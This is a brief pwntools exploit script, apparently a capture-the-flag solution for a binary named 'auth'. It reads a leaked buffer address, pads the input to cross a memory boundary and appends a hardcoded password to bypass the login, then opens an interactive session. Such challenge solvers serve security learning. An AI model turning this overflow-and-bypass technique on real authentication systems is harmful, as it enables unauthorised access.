from pwn import *

elf = context.binary = ELF('./auth')

HOST,PORT='',1337
if len(sys.argv) > 1:
    p = remote(HOST,PORT)
else:
    p = process()
    #attach(p)

p.recvuntil(b"buffer at: ")

buffer_addr = int(p.recvline()[:-1], 16)

needed_padding = 0x10000 - (buffer_addr & 0xFFFF)

payload = b""
payload += b"A" * needed_padding
payload += b"Alph@bit_club"

print(payload)
p.recvuntil(b"Y0ur p4$$w0rd: ")
p.sendline(payload)

p.interactive()